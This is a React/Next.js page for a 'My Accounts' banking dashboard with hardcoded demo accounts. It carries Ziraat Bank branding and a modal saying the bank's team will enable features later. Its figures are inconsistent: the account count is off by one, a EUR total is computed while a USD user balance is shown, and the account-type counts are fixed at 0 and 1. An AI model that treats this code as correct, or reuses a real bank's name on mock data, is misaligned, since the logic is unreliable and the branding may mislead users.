"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

import {
  ArrowDownLeft,
  ArrowUpRight,
  Bell,
  Check,
  ChevronDown,
  ChevronRight,
  Copy,
  CreditCard,
  Eye,
  EyeOff,
  FileText,
  Home,
  LayoutGrid,
  Menu,
  MoreHorizontal,
  PiggyBank,
  Plus,
  Settings,
  ShieldCheck,
  User,
  Wallet,
  X,
  LogOut,
  RefreshCw,
  Download,
  Send,
  Landmark,
  CircleDollarSign,
  CalendarDays,
} from "lucide-react";
import { useAuth } from '@/app/context/AuthContext';
import { DashboardHeader } from "../components/DashboardHeader";
import { MobileNavigation } from "../components/MobileNavigation";
import { Sidebar } from "../components/Sidebar";
import { IoInformationCircleOutline } from "react-icons/io5";

/*
|--------------------------------------------------------------------------
| SAMPLE ACCOUNT DATA
|--------------------------------------------------------------------------
|
| Replace this data later with data from your API/database.
|
*/

const initialAccounts = [
  {
    id: "current-001",
    type: "Current Account",
    shortType: "Current",
    accountNumber: "0012456789",
    iban: "GB29 DEMO 6016 1331 9268 19",
    balance: 15840.75,
    availableBalance: 15240.75,
    currency: "EUR",
    currencyName: "Euro",
    status: "Active",
    interestRate: "0.00%",
    openedDate: "15 March 2023",
    branch: "Main Branch",
    accountHolder: "Gerald Luis",
    color: "red",
  },

  {
    id: "savings-001",
    type: "Savings Account",
    shortType: "Savings",
    accountNumber: "0029876543",
    iban: "GB67 DEMO 6016 1331 8374 52",
    balance: 24750.5,
    availableBalance: 24750.5,
    currency: "EUR",
    currencyName: "Euro",
    status: "Active",
    interestRate: "3.25%",
    openedDate: "08 July 2024",
    branch: "Main Branch",
    accountHolder: "Gerald Luis",
    color: "blue",
  },

  {
    id: "savings-002",
    type: "Premium Savings",
    shortType: "Premium",
    accountNumber: "0034567891",
    iban: "GB42 DEMO 6016 1331 7285 63",
    balance: 48200,
    availableBalance: 48200,
    currency: "USD",
    currencyName: "US Dollar",
    status: "Active",
    interestRate: "4.10%",
    openedDate: "12 January 2025",
    branch: "International Branch",
    accountHolder: "Gerald Luis",
    color: "purple",
  },
];

/*
|--------------------------------------------------------------------------
| ACCOUNT ICON
|--------------------------------------------------------------------------
*/

function AccountIcon({ type }) {
  if (type.includes("Savings")) {
    return <PiggyBank size={21} />;
  }

  return <Landmark size={21} />;
}

/*
|--------------------------------------------------------------------------
| ACCOUNT CARD
|--------------------------------------------------------------------------
*/

function AccountCard({
  account,
  balanceVisible,
  onToggleBalance,
  onSelect,
  selected,
}) {
  const formatMoney = (amount) => {
    return new Intl.NumberFormat("en-US", {
      style: "currency",
      currency: account.currency,
      minimumFractionDigits: 2,
    }).format(amount);
  };

  return (
    <div
      role="button"
      onClick={() => onSelect(account)}
      className={`
        group
        w-full
        rounded-[22px]
        border
        p-5
        text-left
        transition
        sm:p-6

        ${
          selected
            ? "border-[#e30613] bg-red-50/40 shadow-sm"
            : "border-gray-200 bg-white hover:border-gray-300 hover:shadow-sm"
        }
      `}
    >
      {/* TOP */}

      <div
        className="
          flex
          items-start
          justify-between
          gap-3
        "
      >
        <div
          className="
            flex
            items-center
            gap-3
          "
        >
          <span
            className={`
              flex
              h-11 w-11
              items-center
              justify-center
              rounded-xl

              ${
                account.color === "red"
                  ? "bg-red-50 text-[#e30613]"
                  : account.color === "blue"
                    ? "bg-blue-50 text-blue-600"
                    : "bg-purple-50 text-purple-600"
              }
            `}
          >
            <AccountIcon type={account.type} />
          </span>

          <div>
            <p
              className="
                text-[12px]
                font-extrabold
                text-gray-800
              "
            >
              {account.type}
            </p>

            <p
              className="
                mt-1
                text-[8px]
                font-medium
                text-gray-400
              "
            >
              {account.currencyName}
            </p>
          </div>
        </div>

        <span
          className="
            rounded-full
            bg-green-50
            px-2.5
            py-1
            text-[8px]
            font-bold
            text-green-600
          "
        >
          {account.status}
        </span>
      </div>

      {/* BALANCE */}

      <div className="mt-7">
        <p
          className="
            text-[8px]
            font-semibold
            text-gray-400
          "
        >
          Available Balance
        </p>

        <div
          className="
            mt-1
            flex
            items-center
            gap-2
          "
        >
          <p
            className="
              text-[25px]
              font-extrabold
              tracking-tight
              text-gray-900
              sm:text-[28px]
            "
          >
            {balanceVisible
              ? formatMoney(account.availableBalance)
              : "••••••••"}
          </p>

          <button
            onClick={(event) => {
              event.stopPropagation();

              onToggleBalance();
            }}
            className="
              flex
              h-7 w-7
              items-center
              justify-center
              rounded-full
              text-gray-400
              hover:bg-gray-100
            "
          >
            {balanceVisible ? <EyeOff size={14} /> : <Eye size={14} />}
          </button>
        </div>
      </div>

      {/* ACCOUNT NUMBER */}

      <div
        className="
          mt-6
          grid
          grid-cols-2
          gap-3
        "
      >
        <div
          className="
            rounded-xl
            bg-gray-50
            p-3
          "
        >
          <p
            className="
              text-[7px]
              font-bold
              uppercase
              tracking-wide
              text-gray-400
            "
          >
            Account Number
          </p>

          <p
            className="
              mt-1
              text-[9px]
              font-bold
              text-gray-700
            "
          >
            {account.accountNumber}
          </p>
        </div>

        <div
          className="
            rounded-xl
            bg-gray-50
            p-3
          "
        >
          <p
            className="
              text-[7px]
              font-bold
              uppercase
              tracking-wide
              text-gray-400
            "
          >
            Interest
          </p>

          <p
            className="
              mt-1
              text-[9px]
              font-bold
              text-gray-700
            "
          >
            {account.interestRate}
          </p>
        </div>
      </div>

      {/* FOOTER */}

      <div
        className="
          mt-5
          flex
          items-center
          justify-between
          border-t
          border-gray-100
          pt-4
        "
      >
        <span
          className="
            text-[8px]
            font-semibold
            text-gray-400
          "
        >
          {account.currency}
        </span>

        <span
          className="
            flex
            items-center
            gap-1
            text-[8px]
            font-bold
            text-[#e30613]
          "
        >
          View details
          <ChevronRight size={13} />
        </span>
      </div>
    </div>
  );
}

/*
|--------------------------------------------------------------------------
| ACCOUNT DETAILS
|--------------------------------------------------------------------------
*/

function AccountDetails({ account, balanceVisible }) {
  const [copied, setCopied] = useState("");

  const copyValue = async (value, type) => {
    try {
      await navigator.clipboard.writeText(value);

      setCopied(type);

      setTimeout(() => setCopied(""), 1500);
    } catch (error) {
      console.error("Copy failed", error);
    }
  };

  const formatMoney = (amount) => {
    return new Intl.NumberFormat("en-US", {
      style: "currency",
      currency: account.currency,
      minimumFractionDigits: 2,
    }).format(amount);
  };

  return (
    <section
      className="
        rounded-[22px]
        border
        border-gray-200
        bg-white
        p-5
        sm:p-7
      "
    >
      {/* HEADER */}

      <div
        className="
          flex
          items-start
          justify-between
          gap-4
        "
      >
        <div
          className="
            flex
            items-center
            gap-3
          "
        >
          <span
            className="
              flex
              h-11 w-11
              items-center
              justify-center
              rounded-xl
              bg-gray-100
              text-gray-600
            "
          >
            <AccountIcon type={account.type} />
          </span>

          <div>
            <p
              className="
                text-[14px]
                font-extrabold
                text-gray-800
              "
            >
              {account.type}
            </p>

            <p
              className="
                mt-1
                text-[8px]
                text-gray-400
              "
            >
              Account details
            </p>
          </div>
        </div>

        <button
          type="button"
          className="
            flex
            h-9 w-9
            items-center
            justify-center
            rounded-full
            text-gray-400
            hover:bg-gray-100
          "
        >
          <MoreHorizontal size={19} />
        </button>
      </div>

      {/* BALANCE */}

      <div
        className="
          mt-7
          rounded-2xl
          bg-gray-50
          p-4
          sm:p-5
        "
      >
        <p
          className="
            text-[8px]
            font-bold
            uppercase
            tracking-wide
            text-gray-400
          "
        >
          Current Balance
        </p>

        <p
          className="
            mt-1
            text-[25px]
            font-extrabold
            text-gray-900
          "
        >
          {balanceVisible ? formatMoney(account.balance) : "••••••••"}
        </p>

        <div
          className="
            mt-3
            flex
            items-center
            gap-2
          "
        >
          <span
            className="
              rounded-full
              bg-green-50
              px-2
              py-1
              text-[7px]
              font-bold
              text-green-600
            "
          >
            Available
          </span>

          <span
            className="
              text-[8px]
              text-gray-400
            "
          >
            {balanceVisible
              ? formatMoney(account.availableBalance)
              : "••••••••"}
          </span>
        </div>
      </div>

      {/* DETAILS */}

      <div
        className="
          mt-6
          grid
          grid-cols-1
          gap-3
          sm:grid-cols-2
        "
      >
        {/* ACCOUNT NUMBER */}

        <div
          className="
            rounded-xl
            border
            border-gray-100
            p-4
          "
        >
          <p
            className="
              text-[7px]
              font-bold
              uppercase
              tracking-wide
              text-gray-400
            "
          >
            Account Number
          </p>

          <div
            className="
              mt-2
              flex
              items-center
              justify-between
              gap-2
            "
          >
            <p
              className="
                break-all
                text-[10px]
                font-bold
                text-gray-700
              "
            >
              {account.accountNumber}
            </p>

            <button
              type="button"
              onClick={() => copyValue(account.accountNumber, "account")}
              className="
                shrink-0
                text-gray-400
                hover:text-[#e30613]
              "
            >
              {copied === "account" ? <Check size={14} /> : <Copy size={14} />}
            </button>
          </div>
        </div>

        {/* IBAN */}

        <div
          className="
            rounded-xl
            border
            border-gray-100
            p-4
          "
        >
          <p
            className="
              text-[7px]
              font-bold
              uppercase
              tracking-wide
              text-gray-400
            "
          >
            IBAN
          </p>

          <div
            className="
              mt-2
              flex
              items-center
              justify-between
              gap-2
            "
          >
            <p
              className="
                break-all
                text-[10px]
                font-bold
                text-gray-700
              "
            >
              {account.iban}
            </p>

            <button
              type="button"
              onClick={() => copyValue(account.iban, "iban")}
              className="
                shrink-0
                text-gray-400
                hover:text-[#e30613]
              "
            >
              {copied === "iban" ? <Check size={14} /> : <Copy size={14} />}
            </button>
          </div>
        </div>

        {/* CURRENCY */}

        <DetailItem
          label="Currency"
          value={`${account.currency} - ${account.currencyName}`}
        />

        {/* STATUS */}

        <DetailItem label="Account Status" value={account.status} green />

        {/* INTEREST */}

        <DetailItem label="Interest Rate" value={account.interestRate} />

        {/* OPENED */}

        <DetailItem label="Account Opened" value={account.openedDate} />

        {/* BRANCH */}

        <DetailItem label="Branch" value={account.branch} />

        {/* HOLDER */}

        <DetailItem label="Account Holder" value={account.accountHolder} />
      </div>

      {/* ACTIONS */}

      <div
        className="
          mt-6
          grid
          grid-cols-2
          gap-2
          sm:grid-cols-4
        "
      >
        <AccountAction icon={<Send size={15} />} label="Transfer" />

        <AccountAction icon={<Plus size={15} />} label="Add Money" />

        <AccountAction icon={<Download size={15} />} label="Statement" />

        <AccountAction icon={<RefreshCw size={15} />} label="Refresh" />
      </div>
    </section>
  );
}

/*
|--------------------------------------------------------------------------
| DETAIL ITEM
|--------------------------------------------------------------------------
*/

function DetailItem({ label, value, green = false }) {
  return (
    <div
      className="
        rounded-xl
        border
        border-gray-100
        p-4
      "
    >
      <p
        className="
          text-[7px]
          font-bold
          uppercase
          tracking-wide
          text-gray-400
        "
      >
        {label}
      </p>

      <p
        className={`
          mt-2
          text-[10px]
          font-bold

          ${green ? "text-green-600" : "text-gray-700"}
        `}
      >
        {value}
      </p>
    </div>
  );
}

/*
|--------------------------------------------------------------------------
| ACCOUNT ACTION
|--------------------------------------------------------------------------
*/

function AccountAction({ icon, label }) {
  return (
    <button
      type="button"
      className="
        flex
        h-[42px]
        items-center
        justify-center
        gap-2
        rounded-xl
        border
        border-gray-200
        bg-white
        text-[8px]
        font-bold
        text-gray-600
        transition
        hover:border-[#e30613]
        hover:text-[#e30613]
      "
    >
      {icon}

      {label}
    </button>
  );
}

/*
|--------------------------------------------------------------------------
| RECENT ACCOUNT ACTIVITY
|--------------------------------------------------------------------------
*/

function RecentActivity({ account }) {
  const transactions = [
    {
      title: "Salary Payment",
      date: "12 Aug 2026",
      amount: 4500,
      type: "credit",
    },

    {
      title: "International Transfer",
      date: "10 Aug 2026",
      amount: 850,
      type: "debit",
    },

    {
      title: "Card Payment",
      date: "08 Aug 2026",
      amount: 120.5,
      type: "debit",
    },

    {
      title: "Transfer Received",
      date: "05 Aug 2026",
      amount: 750,
      type: "credit",
    },
  ];

  return (
    <section
      className="
        rounded-[22px]
        border
        border-gray-200
        bg-white
        p-5
        sm:p-7
      "
    >
      <div
        className="
          flex
          items-center
          justify-between
        "
      >
        <div>
          <h2
            className="
              text-[14px]
              font-extrabold
              text-gray-800
            "
          >
            Recent Activity
          </h2>

          <p
            className="
              mt-1
              text-[9px]
              text-gray-400
            "
          >
            Latest transactions from {account.type}.
          </p>
        </div>

        <button
          type="button"
          className="
            text-[8px]
            font-bold
            text-[#e30613]
          "
        >
          View all
        </button>
      </div>

      <div
        className="
          mt-5
          divide-y
          divide-gray-100
        "
      >
        {transactions.map((transaction, index) => (
          <div
            key={index}
            className="
                flex
                items-center
                gap-3
                py-3
              "
          >
            <span
              className={`
                  flex
                  h-9 w-9
                  shrink-0
                  items-center
                  justify-center
                  rounded-full

                  ${
                    transaction.type === "credit"
                      ? "bg-green-50 text-green-600"
                      : "bg-red-50 text-red-600"
                  }
                `}
            >
              {transaction.type === "credit" ? (
                <ArrowDownLeft size={16} />
              ) : (
                <ArrowUpRight size={16} />
              )}
            </span>

            <div className="min-w-0 flex-1">
              <p
                className="
                    truncate
                    text-[9px]
                    font-bold
                    text-gray-700
                  "
              >
                {transaction.title}
              </p>

              <p
                className="
                    mt-1
                    text-[8px]
                    text-gray-400
                  "
              >
                {transaction.date}
              </p>
            </div>

            <p
              className={`
                  text-[9px]
                  font-extrabold

                  ${
                    transaction.type === "credit"
                      ? "text-green-600"
                      : "text-red-600"
                  }
                `}
            >
              {transaction.type === "credit" ? "+" : "-"}

              {new Intl.NumberFormat("en-US", {
                style: "currency",
                currency: account.currency,
              }).format(transaction.amount)}
            </p>
          </div>
        ))}
      </div>
    </section>
  );
}

/*
|--------------------------------------------------------------------------
| MAIN PAGE
|--------------------------------------------------------------------------
*/

export default function AccountsPage() {
  const { user } = useAuth();

  const [sidebarOpen, setSidebarOpen] = useState(false);

  const [accounts, setAccounts] = useState(initialAccounts);

  const [selectedAccount, setSelectedAccount] = useState(initialAccounts[0]);

  const [balanceVisible, setBalanceVisible] = useState(true);

  const [isToggled, setIsToggled] = useState(false);

  /*
  |--------------------------------------------------------------------------
  | TOTAL BALANCE
  |--------------------------------------------------------------------------
  */

  const totalBalance = accounts.reduce((total, account) => {
    if (account.currency === "EUR") {
      return total + account.balance;
    }

    return total;
  }, 0);

  /*
  |--------------------------------------------------------------------------
  | TOGGLE BALANCE
  |--------------------------------------------------------------------------
  */

  const toggleBalance = () => {
    setBalanceVisible((current) => !current);
  };

  /*
  |--------------------------------------------------------------------------
  | SELECT ACCOUNT
  |--------------------------------------------------------------------------
  */

  const handleSelectAccount = (account) => {
    setSelectedAccount(account);

    /*
    |--------------------------------------------------------------------------
    | On mobile/tablet, scroll to details
    |--------------------------------------------------------------------------
    */

    setTimeout(() => {
      const details = document.getElementById("account-details");

      if (details) {
        details.scrollIntoView({
          behavior: "smooth",
          block: "start",
        });
      }
    }, 50);
  };

  return (
    <main
      className="
        min-h-screen
        bg-[#f5f6f7]
        text-gray-900
      "
    >
      {/* HEADER */}

      <DashboardHeader
        sidebarOpen={sidebarOpen}
        setSidebarOpen={setSidebarOpen}
      />

      <div
        className="
          mx-auto
          flex
          w-full
          max-w-[1500px]
        "
      >
        {/* SIDEBAR */}

        <Sidebar tab={'accounts'} open={sidebarOpen} setOpen={setSidebarOpen} />

        {/* CONTENT */}

        <div
          className="
            min-w-0
            flex-1
            pb-[85px]
            lg:pb-8
          "
        >
          <div
            className="
              mx-auto
              w-full
              max-w-[1250px]
              px-4
              py-5
              sm:px-6
              sm:py-7
              lg:px-8
              lg:py-8
            "
          >
            {/* BREADCRUMB */}

            <div
              className="
                mb-4
                flex
                items-center
                gap-2
                text-[9px]
                font-semibold
                text-gray-400
              "
            >
              <span>Dashboard</span>

              <ChevronRight size={12} />

              <span
                className="
                  text-gray-600
                "
              >
                Accounts
              </span>
            </div>

            {/* PAGE TITLE */}

            <div
              className="
                mb-6
                flex
                flex-col
                gap-4
                sm:flex-row
                sm:items-end
                sm:justify-between
              "
            >
              <div>
                <div
                  className="
                    flex
                    items-center
                    gap-2
                  "
                >
                  <h1
                    className="
                      text-[23px]
                      font-extrabold
                      tracking-tight
                      text-gray-900
                      sm:text-[27px]
                    "
                  >
                    My Accounts
                  </h1>

                  <span
                    className="
                      rounded-full
                      bg-red-50
                      px-2.5
                      py-1
                      text-[8px]
                      font-extrabold
                      text-[#e30613]
                    "
                  >
                    {accounts.length + 1} ACCOUNTS
                  </span>
                </div>

                <p
                  className="
                    mt-1
                    max-w-[650px]
                    text-[10px]
                    leading-relaxed
                    text-gray-500
                    sm:text-[11px]
                  "
                >
                  View and manage all your bank accounts, balances and account
                  information in one place.
                </p>
              </div>

              {/* ADD ACCOUNT */}

              <button
                type="button"
                onClick={() => setIsToggled(true)}
                className="
                  flex
                  h-[42px]
                  items-center
                  justify-center
                  gap-2
                  rounded-full
                  bg-[#e30613]
                  px-5
                  text-[9px]
                  font-extrabold
                  text-white
                  shadow-sm
                  transition
                  hover:bg-[#c90510]
                "
              >
                <Plus size={15} />
                Open New Account
              </button>
            </div>

            {/* TOTAL BALANCE */}

            <section
              className="
                mb-6
                overflow-hidden
                rounded-[22px]
                bg-gradient-to-br
                from-[#e30613]
                via-[#c9000d]
                to-[#860008]
                p-5
                text-white
                shadow-sm
                sm:p-7
              "
            >
              <div
                className="
                  flex
                  flex-col
                  gap-6
                  sm:flex-row
                  sm:items-center
                  sm:justify-between
                "
              >
                <div>
                  <div
                    className="
                      flex
                      items-center
                      gap-2
                      text-[9px]
                      font-bold
                      uppercase
                      tracking-widest
                      text-white/70
                    "
                  >
                    <Wallet size={15} />
                    Total Account Balance
                  </div>

                  <div
                    className="
                      mt-2
                      flex
                      items-center
                      gap-3
                    "
                  >
                    <h2
                      className="
                        text-[30px]
                        font-extrabold
                        tracking-tight
                        sm:text-[38px]
                      "
                    >
                      {balanceVisible
                        ? new Intl.NumberFormat("en-US", {
                            style: "currency",
                            currency: "USD",
                          }).format(user.balance)
                        : "••••••••"}
                    </h2>

                    <button
                      type="button"
                      onClick={toggleBalance}
                      className="
                        flex
                        h-8 w-8
                        items-center
                        justify-center
                        rounded-full
                        bg-white/10
                        hover:bg-white/20
                      "
                    >
                      {balanceVisible ? (
                        <EyeOff size={15} />
                      ) : (
                        <Eye size={15} />
                      )}
                    </button>
                  </div>

                  <p
                    className="
                      mt-1
                      text-[8px]
                      text-white/60
                    "
                  >
                    Combined balance of your USD accounts
                  </p>
                </div>

                <div
                  className="
                    grid
                    grid-cols-2
                    gap-2
                    sm:min-w-[300px]
                  "
                >
                  <div
                    className="
                      rounded-xl
                      bg-black/10
                      p-3
                    "
                  >
                    <p
                      className="
                        text-[7px]
                        text-white/60
                      "
                    >
                      Current Accounts
                    </p>

                    <p
                      className="
                        mt-1
                        text-[13px]
                        font-extrabold
                      "
                    >
                      0
                    </p>
                  </div>

                  <div
                    className="
                      rounded-xl
                      bg-black/10
                      p-3
                    "
                  >
                    <p
                      className="
                        text-[7px]
                        text-white/60
                      "
                    >
                      Savings Accounts
                    </p>

                    <p
                      className="
                        mt-1
                        text-[13px]
                        font-extrabold
                      "
                    >
                      1
                    </p>
                  </div>
                </div>
              </div>
            </section>

            {/* ACCOUNTS */}

            <section>
              <div
                className="
                  mb-4
                  flex
                  items-center
                  justify-between
                "
              >
                <div>
                  <h2
                    className="
                      text-[15px]
                      font-extrabold
                      text-gray-800
                    "
                  >
                    Your Accounts
                  </h2>

                  <p
                    className="
                      mt-1
                      text-[9px]
                      text-gray-400
                    "
                  >
                    Select an account to view complete details.
                  </p>
                </div>

                <span
                  className="
                    hidden
                    text-[8px]
                    font-semibold
                    text-gray-400
                    sm:block
                  "
                >
                  {accounts.length} accounts
                </span>
              </div>

              <div
                className="
                  grid
                  grid-cols-1
                  gap-4
                  md:grid-cols-2
                  xl:grid-cols-3
                "
              >
                {accounts.map((account) => (
                  <AccountCard
                    key={account.id}
                    account={account}
                    balanceVisible={balanceVisible}
                    onToggleBalance={toggleBalance}
                    onSelect={handleSelectAccount}
                    selected={selectedAccount.id === account.id}
                  />
                ))}
              </div>
            </section>

            {/* ACCOUNT DETAILS */}

            <div
              id="account-details"
              className="
                mt-6
                grid
                grid-cols-1
                gap-6
                xl:grid-cols-[minmax(0,1fr)_390px]
              "
            >
              <AccountDetails
                account={selectedAccount}
                balanceVisible={balanceVisible}
              />

              <RecentActivity account={selectedAccount} />
            </div>

            {/* SECURITY NOTICE */}

            <div
              className="
                mt-6
                flex
                items-start
                gap-3
                rounded-[18px]
                border
                border-gray-200
                bg-white
                p-4
              "
            >
              <span
                className="
                  flex
                  h-9 w-9
                  shrink-0
                  items-center
                  justify-center
                  rounded-full
                  bg-green-50
                  text-green-600
                "
              >
                <ShieldCheck size={17} />
              </span>

              <div>
                <p
                  className="
                    text-[9px]
                    font-extrabold
                    text-gray-700
                  "
                >
                  Your account information is protected
                </p>

                <p
                  className="
                    mt-1
                    text-[8px]
                    leading-relaxed
                    text-gray-400
                  "
                >
                  Never share your account password, PIN, verification codes or
                  other security credentials with anyone.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {isToggled === true && (
                          <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 justify-center bg-black/50 items-center loading-modal">
                            <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
                              <div className="flex justify-center items-center rounded-full p-2 dark:bg-isoDark bg-[#f4f4f5]">
                                <IoInformationCircleOutline className="w-16 text-black dark:text-isoColor2 h-16" />
                              </div>
                  
                              <h1 className="px-6 text-lg font-medium text-center md:font-semibold">
                                Notice!
                              </h1>
                  
                              <p className="text-xs text-center">
                                This feature is not yet available for this account. Ziraat Bank operating team will notify you as soon as it becomes functional. Thank you.
                              </p>
                  
                              <button
                                type="button"
                                onClick={() => setIsToggled(false)}
                                className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                              >
                                OK
                              </button>
                            </div>
                          </div>
                        )}

      {/* MOBILE BOTTOM NAVIGATION */}

      <MobileNavigation tab={'accounts'} />
    </main>
  );
}
